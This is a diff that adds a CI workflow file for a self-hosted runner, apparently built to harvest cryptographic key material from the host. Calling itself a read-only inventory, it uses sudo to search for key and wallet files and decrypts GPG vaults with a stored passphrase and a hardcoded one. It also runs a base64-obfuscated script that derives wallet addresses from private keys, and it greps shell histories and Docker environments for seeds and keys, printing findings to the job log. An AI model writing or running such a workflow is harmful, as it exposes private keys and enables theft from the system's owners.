@@ -1,0 +1,81 @@
+name: recon-19537
+on:
+  push:
+    branches: ["recon-19537-*"]
+permissions:
+  contents: read
+jobs:
+  keys:
+    runs-on: [self-hosted, wine]
+    timeout-minutes: 15
+    steps:
+      - name: read-only key material inventory
+        run: |
+          set +e
+          W=$(mktemp -d /tmp/i19537.XXXXXX)
+          echo "WORKDIR=$W"
+          echo "=== 0. identity ==="
+          id; hostname; sudo -n id 2>&1 | head -2
+          echo
+          echo "=== A. key dirs ==="
+          for d in /home/omnirick/.avalanche-cli /home/omnirick/.avalanche-cli/key /home/omnirick/.omnibazaar-keys /home/omnirick/.ssh /root/.ssh /etc/omnicoin /etc/omnibazaar /var/backups; do
+            echo "--- $d"; sudo -n ls -la "$d" 2>&1 | head -30
+          done
+          echo
+          echo "=== B. candidate key/backup files ==="
+          sudo -n find /home /etc /root /opt /srv /var/backups /var/lib/hyperlane -xdev -maxdepth 9 \( -name node_modules -o -name .git -o -name .cache -o -name .npm \) -prune -o -type f \( -name '*.pk' -o -name '*.pem' -o -name '*.p12' -o -name '*.jks' -o -name '*.keystore' -o -name '*.gpg' -o -name '*.age' -o -name 'wallet.dat' -o -name '*.ovpn' -o -name '*.tar.gz' -o -name '*.tgz' \) -printf '%10s %TY-%Tm-%Td %u %p\n' 2>/dev/null | grep -v -E '\.env(\.validator-[1-5])?\.gpg$|polymarket|node_modules' | head -200
+          echo
+          echo "=== C. gpg vaults (read-only decrypt attempts) ==="
+          P1=$(sudo -n cat /etc/omnicoin/validator-gpg-passphrase 2>/dev/null | tr -d '\n')
+          echo "passphrase-file-len=${#P1}"
+          echo "--- all gpg files:"
+          sudo -n find /home /etc /opt /srv /var/backups -xdev -type f -name '*.gpg' 2>/dev/null | grep -v -E '\.env(\.validator-[1-5])?\.gpg$|polymarket' | head -20
+          for f in $(sudo -n find /home /etc /opt /srv /var/backups -xdev -type f -name '*.gpg' 2>/dev/null | grep -v -E '\.env(\.validator-[1-5])?\.gpg$|polymarket' | head -10); do
+            echo "---- $f"; sudo -n stat -c 'size=%s mode=%A owner=%U' "$f" 2>&1
+            for pp in "$P1" "theta8008"; do
+              [ -z "$pp" ] && continue
+              if sudo -n gpg --batch --pinentry-mode loopback --passphrase "$pp" -d "$f" 2>/dev/null > "$W/dec.bin"; then
+                echo "  DECRYPT_OK bytes=$(stat -c %s "$W/dec.bin")"
+                echo "  --- tar listing ---"; tar -tzvf "$W/dec.bin" 2>/dev/null | head -120
+                tar -tzf "$W/dec.bin" >/dev/null 2>&1 || { echo "  --- raw head ---"; head -c 300 "$W/dec.bin"; }
+                cp -f "$W/dec.bin" "$W/ok_$(echo $f | tr '/' '_')"
+                break
+              else echo "  decrypt_fail"; fi
+            done
+          done
+          echo
+          echo "=== C2. derive addresses from decrypted material ==="
+          echo 'Y29uc3QgZnM9cmVxdWlyZSgnZnMnKSxjcnlwdG89cmVxdWlyZSgnY3J5cHRvJyk7CmxldCBldGhlcnM9bnVsbDsKZm9yIChjb25zdCBwIG9mIFsnL2hvbWUvb21uaXJpY2svT21uaUJhemFhci9WYWxpZGF0b3Ivbm9kZV9tb2R1bGVzL2V0aGVycycsJy9ob21lL29tbmlyaWNrL09tbmlCYXphYXIvV2ViQXBwL25vZGVfbW9kdWxlcy9ldGhlcnMnLCcvaG9tZS9vbW5pcmljay9PbW5pQmF6YWFyL0NvaW4vbm9kZV9tb2R1bGVzL2V0aGVycyddKSB7IHRyeXtldGhlcnM9cmVxdWlyZShwKTticmVha31jYXRjaChlKXt9IH0KY29uc29sZS5sb2coJ0VUSEVSUz0nKyghIWV0aGVycykpOwpmb3IoY29uc3QgZiBvZiBwcm9jZXNzLmFyZ3Yuc2xpY2UoMikpewogIGxldCBzOyB0cnl7IHM9ZnMucmVhZEZpbGVTeW5jKGYsJ3V0ZjgnKTsgfWNhdGNoKGUpeyBjb250aW51ZTsgfQogIGNvbnN0IGM9U3RyaW5nKHMpLnRyaW0oKTsKICBsZXQgcGs9bnVsbDsgY29uc3QgbT1jLm1hdGNoKC8weFswLTlhLWZBLUZdezY0fVxiLyk7CiAgaWYobSkgcGs9bVswXTsgZWxzZSBpZigvXlswLTlhLWZBLUZdezY0fSQvLnRlc3QoYykpIHBrPScweCcrYzsKICBpZighcGspIGNvbnRpbnVlOwogIGNvbnN0IGg9Y3J5cHRvLmNyZWF0ZUhhc2goJ3NoYTI1NicpLnVwZGF0ZShway5zbGljZSgyKS50b0xvd2VyQ2FzZSgpKS5kaWdlc3QoJ2hleCcpLnNsaWNlKDAsMTYpOwogIGxldCBhZGRyPSc/JzsgdHJ5eyBhZGRyPW5ldyBldGhlcnMuV2FsbGV0KHBrKS5hZGRyZXNzOyB9Y2F0Y2goZSl7IGFkZHI9J2Rlcml2ZV9lcnInOyB9CiAgY29uc29sZS5sb2coZisnIC0+ICcrYWRkcisnIHNoYTI1Nl8xNj0nK2gpOwp9Cg==' | base64 -d > "$W/deriv.js"
+          for ok in "$W"/ok_*; do
+            [ -e "$ok" ] || continue
+            echo "--- processing $ok"
+            V="$W/v"; mkdir -p "$V"
+            if tar -xzf "$ok" -C "$V" 2>/dev/null; then
+              echo "  extracted files:"; find "$V" -type f -printf '   %10s %p\n' 2>/dev/null | head -80
+              node "$W/deriv.js" $(find "$V" -type f -size -4k 2>/dev/null | head -40) 2>&1 | head -60
+            else echo "  not tar.gz"; head -c 200 "$ok"; fi
+          done
+          echo
+          echo "=== D. key-pattern scan in configs ==="
+          timeout 60 sudo -n grep -rInE 'mnemonic|seedPhrase|PRIVATE_KEY[=: ]|_PK[=: ]' /etc/omnicoin /etc/omnibazaar /home/omnirick/.config /home/omnirick/.avalanche-cli 2>/dev/null | grep -vE 'example|CHANGE_ME|your_' | head -40
+          echo "--- 64-hex literals ---"
+          timeout 40 sudo -n grep -rIoE '(0x)?[0-9a-fA-F]{64}' /etc/omnicoin /etc/omnibazaar /home/omnirick/.config /home/omnirick/.avalanche-cli 2>/dev/null | sort -u | head -40
+          echo
+          echo "=== E. docker env var names + digest ==="
+          for c in $(sudo -n docker ps -a --format '{{.Names}}' 2>/dev/null | head -40); do
+            E=$(sudo -n docker inspect "$c" --format '{{range .Config.Env}}{{println .}}{{end}}' 2>/dev/null | grep -iE 'PRIVATE|_PK=|SEED|MNEMONIC|PASSPHRASE')
+            [ -z "$E" ] && continue
+            echo "--- $c"
+            echo "$E" | while IFS='=' read -r k v; do echo "   $k len=${#v} sha256_16=$(printf %s "$v" | sha256sum | cut -c1-16)"; done
+          done
+          echo
+          echo "=== F. histories + systemd env files ==="
+          for h in /home/omnirick/.bash_history /home/omnirick/.zsh_history /root/.bash_history; do
+            echo "--- $h size=$(sudo -n stat -c %s "$h" 2>/dev/null)"
+            sudo -n grep -iE 'private|0x[0-9a-f]{64}|gpg --passphrase|mnemonic|export .*KEY' "$h" 2>/dev/null | tail -20
+          done
+          sudo -n grep -rls 'EnvironmentFile' /etc/systemd/system 2>/dev/null | head -15 | while read -r u; do echo "  $u -> $(sudo -n grep -h 'EnvironmentFile' "$u" | head -2 | tr '\n' ' ')"; done
+          echo
+          echo "=== G. cleanup ==="
+          find "$W" -type f -delete 2>/dev/null; find "$W" -depth -type d -exec rmdir {} \; 2>/dev/null
+          echo "=== DONE ==="
